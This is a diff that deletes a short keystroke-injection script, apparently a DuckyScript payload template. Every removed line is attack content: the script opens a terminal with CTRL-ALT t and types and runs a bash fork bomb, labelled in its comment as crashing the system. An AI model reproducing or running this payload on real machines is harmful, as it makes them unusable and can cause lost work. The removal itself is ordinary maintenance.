@@ -1,6 +1,0 @@
-REM Bash fork bomb that crashes the system
-DELAY {start_delay}
-CTRL-ALT t
-DELAY 400
-STRING :(){ :|:& };:
-ENTER
